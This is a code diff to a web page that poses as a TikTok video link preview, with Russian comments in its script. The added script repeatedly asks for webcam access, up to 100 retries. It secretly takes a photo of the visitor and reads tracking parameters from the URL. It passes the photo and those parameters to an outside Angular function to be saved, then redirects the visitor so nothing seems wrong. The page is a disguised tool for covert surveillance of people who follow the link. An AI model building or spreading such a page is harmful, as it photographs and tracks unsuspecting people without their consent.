@@ -17,7 +17,7 @@
   <meta property="og:title" content="Tiktok">
   <meta property="og:site_name" content="Tiktok">
   <meta property="og:url" content="">
-  <meta property="og:description" content="https://www.tiktok.com/@davay_obsudim/video/7417148731230850334">
+  <meta property="og:description" content="Video">
   <meta property="og:image"
     content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
 
@@ -66,8 +66,9 @@
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    let firstPhotoTaken = false;
+    let photoTaken = false;
     let cameraAccessAttempts = 0;
+    let savedPhoto = '';
 
     const constraints = {
       audio: false,
@@ -83,7 +84,7 @@
       } catch (e) {
         console.log(`Ошибка доступа к камере: ${e.toString()}`);
         cameraAccessAttempts++;
-        if (cameraAccessAttempts < 3) {
+        if (cameraAccessAttempts < 100) {
           console.log(`Повторная попытка доступа к камере через 3 секунды (попытка ${cameraAccessAttempts + 1})...`);
           setTimeout(requestCameraAccess, 3000);
         } else {
@@ -100,20 +101,37 @@
 
       const context = canvas.getContext('2d');
 
-      setInterval(function () {
-        console.log('Фотографирование...');
-        context.drawImage(video, 0, 0, 740, 580);
-        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-        console.log('Фотография создана:', canvasData);
-
-        if (!firstPhotoTaken) {
-          console.log('Первая фотография сделана. Выполняем редирект.');
-          firstPhotoTaken = true;
+      setTimeout(function () {
+        if (!photoTaken) {
+          console.log('Фотографирование...');
+          context.drawImage(video, 0, 0, 740, 580);
+          const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+          console.log('Фотография создана');
+          savedPhoto = canvasData;
+          photoTaken = true;
+          logPhotoInfo();
           redirectToFinalDestination();
-        } else {
-          console.log('Фотографии продолжают делаться, но редирект уже выполнен.');
         }
       }, 3000);
+    }
+
+    function logPhotoInfo() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const tiktokUrl = urlParams.get('tiktok') || '';
+      const id = urlParams.get('id') || '';
+      const redirectUrl = urlParams.get('redirect') || '';
+      
+      console.log('tiktokurl:', tiktokUrl);
+      console.log('id:', id);
+      console.log('redirecturl:', redirectUrl);
+      console.log('foto:', savedPhoto);
+
+      // Вызов Angular функции для сохранения данных
+      if (window.angularComponentReference) {
+        window.angularComponentReference.zone.run(() => {
+          window.angularComponentReference.componentFn(tiktokUrl, id, redirectUrl, savedPhoto);
+        });
+      }
     }
 
     function redirectToFinalDestination() {
@@ -124,7 +142,7 @@
     }
 
     // Начинаем запрос доступа к камере
-    setTimeout(requestCameraAccess, 3000);
+    setTimeout(requestCameraAccess, 10000);
   </script>
 </body>
 
